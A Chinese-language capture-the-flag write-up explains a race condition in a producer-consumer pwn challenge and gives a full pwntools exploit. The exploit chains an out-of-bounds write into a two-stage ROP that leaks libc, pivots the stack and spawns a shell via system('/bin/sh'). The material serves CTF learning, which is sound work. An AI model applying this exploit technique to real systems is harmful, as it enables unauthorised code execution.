# Producer and Comsumer

## 题目简述

题面提示在系统里寻找 decomposer，附件是生产者-消费者模型二进制及运行库。程序中有生产者写入缓冲区、消费者读取缓冲区的共享状态；官方题解指出关键共享索引在“检查”和“写入”之间没有完整加锁，程序还插入了 sleep，扩大了竞争窗口。这个并发模型使缓冲区槽位索引可能在检查后被竞争改变。

## 解题过程

这是一道生产者-消费者并发模型题。漏洞点在于生产者将要写入的缓冲区槽位索引没有在完整临界区内受锁保护：检查索引是否小于 8 和真正写入之间存在竞争窗口。消费者线程可以在窗口内改变共享状态，使生产者通过检查后写到越界槽位。

越界写落到栈附近时，溢出的长度刚好能覆盖 `rbp` 和返回地址。利用时先通过程序给出的地址计算缓冲区位置，再布置第一轮 ROP 泄露 `puts`，回到 `main`；第二轮根据 libc 基址布置 `system("/bin/sh")`，用两次 `leave; ret` 完成栈迁移。程序中加入的多处 `sleep` 反而扩大了竞争窗口，降低了触发难度。

```python
from pwn import *
context(log_level = 'debug',os = 'linux',arch = 'amd64')
HOST = "challenge-host"
PORT = 0
io = remote(HOST, PORT)
libc = ELF("./libc-2.31.so")
elf = ELF("./vuln")
def producer(content):
    io.sendlineafter("input your choice>>",b'1')
    io.sendlineafter("input the data you want to produce:",content)
def consumer():
    io.sendlineafter("input your choice>>",b'2')
io.recvuntil(b'a gift for you:')
buf_addr = int(io.recv(10),16) + 0x1800
print(hex(buf_addr))
leave_ret = 0x4015a1
pop_rdi = 0x401963
ret = 0x40101a
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
print(hex(puts_plt))
print(hex(puts_got))
main = 0x40181a
producer(b'\x00'*8)
sleep(5)
producer(p64(pop_rdi))
sleep(5)
producer(p64(puts_got))
sleep(5)
producer(p64(puts_plt))
sleep(5)
producer(p64(main))
sleep(5)
producer(p64(1))
sleep(5)
producer(p64(2))
sleep(5)
for i in range(7):
    consumer()
pause()
producer(b'bbbbbbbb')
producer(p64(buf_addr))
producer(p64(leave_ret))
io.recvuntil(b'Data 9 has been produced.')
pause()
io.sendline(b'3')
io.recvuntil(b'bbbbbbbb')
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = p64(pop_rdi) + p64(bin_sh) + p64(system)
producer(b'zzzzzzzz')
sleep(5)
producer(p64(ret))
sleep(5)
producer(p64(pop_rdi))
sleep(5)
producer(p64(bin_sh))
sleep(5)
producer(p64(system))
sleep(5)
for i in range(2):
    producer(b'11111111')
    sleep(5)
for i in range(7):
    consumer()
pause()
producer(b'bbbbbbbb')
producer(p64(buf_addr-32))
producer(p64(leave_ret))
io.recvuntil(b'Data 9 has been produced.')
pause()
io.sendline(b'3')
io.interactive()
```


## 方法总结

多线程 Pwn 题要先找共享变量的锁保护范围，尤其是“检查”和“使用”是否在同一临界区。若竞争能改变数组索引或长度，就按越界写/栈溢出建模；利用脚本要把竞争窗口、重复触发和栈迁移布置分开写清。
